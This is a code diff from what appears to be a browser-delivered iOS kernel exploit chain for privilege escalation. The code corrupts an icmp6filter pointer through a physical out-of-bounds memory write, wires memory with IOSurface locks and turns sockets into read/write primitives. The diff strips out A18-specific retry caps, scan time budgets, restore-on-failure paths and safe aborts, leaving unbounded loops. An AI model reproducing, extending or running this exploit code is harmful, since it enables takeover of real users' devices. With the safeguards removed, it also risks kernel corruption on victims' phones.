@@ -1,9 +1,7 @@
 (() => {
-  const LS_PE_PAYLOAD_REVISION = "20260904.9";
+  const LS_PE_PAYLOAD_REVISION = "20260904.10";
   const PE_ENABLE_DEBUG_NETWORK = globalThis.__pe_enable_debug_network === true;
   const LS_RETAIN_KRW_FOR_VISIBLE_TEST = false;
-  const PE_A18_SCAN_BUDGET_MS = 120000;
-  const PE_A18_CORRUPT_MAX_ATTEMPTS = 16;
   // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
   try {
     if (PE_ENABLE_DEBUG_NETWORK && typeof XMLHttpRequest !== 'undefined') {
@@ -1858,8 +1856,10 @@
   function surface_mlock(address, size) {
     let surf = create_surface_with_address(address, size);
     if (surf == 0n) {
-      LOG((is_a18_devices ? "[PE-A18]" : "[-]") +
-          " IOSurface lock creation failed address=" + address.hex() + " size=" + size.hex());
+      LOG((is_a18_devices
+          ? "[PE-A18] IOSurface lock creation returned null; continuing original acquisition flow"
+          : "[-] IOSurface lock creation failed") +
+          " address=" + address.hex() + " size=" + size.hex());
       return false;
     }
     mlock_dict[address] = surf;
@@ -2174,7 +2174,6 @@
       let selected_control_port = socket_ports[control_socket_idx];
       let selected_rw_port = socket_ports[control_socket_idx + 0x1n];
       LOG("[+] Corrupting icmp6filter pointer...");
-      let corrupt_attempt = 0;
       while (true) {
         physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
         if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) != KERN_SUCCESS) {
@@ -2186,15 +2185,6 @@
         if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
           LOG("[+] target corrupted: " + uread64(read_buffer + pcb_start_offset + icmp6filt_offset).hex());
           break;
-        }
-        corrupt_attempt++;
-        if (is_a18_devices && corrupt_attempt >= PE_A18_CORRUPT_MAX_ATTEMPTS) {
-          LOG("[PE-A18] corruption retry budget exhausted attempts=" + corrupt_attempt);
-          let restored = restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
-                                                      pcb_start_offset, icmp6filt_offset,
-                                                      icmp6filter, control_orig_cksum);
-          if (!restored) return mark_a18_cleanup_unsafe(selected_control_port);
-          return -1n;
         }
       }
       let sock = fileport_makefd(selected_control_port);
@@ -2431,20 +2421,13 @@
         } while (kr != KERN_SUCCESS);
       }
       wired_mapping_entries_addresses.push(wired_address);
-      if (!surface_mlock(wired_address, wired_mapping_entry_size)) {
-        LOG("[PE-A18] aborting acquisition after wired IOSurface lock failure");
-        return false;
-      }
+      surface_mlock(wired_address, wired_mapping_entry_size);
       uwrite64(wired_address, wired_page_marker);
       uwrite64(wired_address + 0x8n, wired_address);
     }
     let target_inp_gencnt_list = [];
     LOG("[i] Allocating memory done");
-    let acquisition_success = false;
-    let a18_scan_started = Date.now();
-    let a18_search_pass = 0;
     while (true) {
-      a18_search_pass++;
       let search_mapping_size = 0x800n * PAGE_SIZE;
       let search_mapping_address = new_bigint();
       kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
@@ -2455,11 +2438,7 @@
       for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
         uwrite64(search_mapping_address + k, random_marker);
       }
-      if (!surface_mlock(search_mapping_address, search_mapping_size)) {
-        LOG("[PE-A18] aborting acquisition after search IOSurface lock failure");
-        mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
-        break;
-      }
+      surface_mlock(search_mapping_address, search_mapping_size);
       let memory_object = new_bigint();
       let memory_object_size = BigInt(search_mapping_size);
       kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
@@ -2474,15 +2453,8 @@
       let split_count = 8n;
       let wired_pages = [];
       let success = false;
-      let scan_budget_exhausted = false;
       let seeking_offset = 0n;
       while (seeking_offset < search_mapping_size) {
-        if (is_a18_devices && Date.now() - a18_scan_started >= PE_A18_SCAN_BUDGET_MS) {
-          scan_budget_exhausted = true;
-          LOG("[PE-A18] scan budget exhausted pass=" + a18_search_pass +
-              " offset=" + seeking_offset.hex() + " budget_ms=" + PE_A18_SCAN_BUDGET_MS);
-          break;
-        }
         kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
         if (kr != KERN_SUCCESS) {
           seeking_offset += PAGE_SIZE;
@@ -2562,14 +2534,6 @@
       }
       kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
       if (success == true) {
-        acquisition_success = true;
-        break;
-      }
-      if (is_a18_devices) {
-        // Do not retain another A18 search IOSurface after an exhausted pass.
-        // A new page launch is the retry boundary.
-        LOG("[PE-A18] ending acquisition without a validated pair pass=" + a18_search_pass +
-            " budget_exhausted=" + (scan_budget_exhausted ? "1" : "0"));
         break;
       }
     }
@@ -2582,7 +2546,6 @@
     } else {
       LOG("[PE-A18] preserved IOSurface locks to match Lara pe_a18");
     }
-    return acquisition_success;
   }
   function pe() {
     LOG("[PE-DBG] pe() entered");
@@ -2609,22 +2572,7 @@
       LOG("[PE-DBG] A18 settle sleep done; calling pe_init()");
       pe_init();
       LOG("[PE-DBG] pe_init() done, about to call pe_v2()...");
-      if (pe_v2() !== true) {
-        LOG("[PE-A18] acquisition stopped safely without a validated socket pair");
-        try {
-          uwrite64(go_sync_ptr, 0n);
-          uwrite64(race_sync_ptr, 1n);
-          js_thread_join(free_thread_jsthread);
-          free_thread_jsthread = 0n;
-        } catch (e) {
-          LOG("[PE-A18] failed to stop physical R/W thread after scan abort: " + String(e));
-        }
-        if (write_fd > 0n && write_fd != 0xFFFFFFFFFFFFFFFFn) try { close(write_fd); } catch (_) {}
-        if (read_fd > 0n && read_fd != 0xFFFFFFFFFFFFFFFFn) try { close(read_fd); } catch (_) {}
-        write_fd = 0n;
-        read_fd = 0n;
-        throw new Error("A18 acquisition ended without a validated socket pair; retry the full chain");
-      }
+      pe_v2();
     } else {
       LOG("[PE-DBG] non-A18 branch selected");
       LOG("[+] Running on non-A18 Devices");
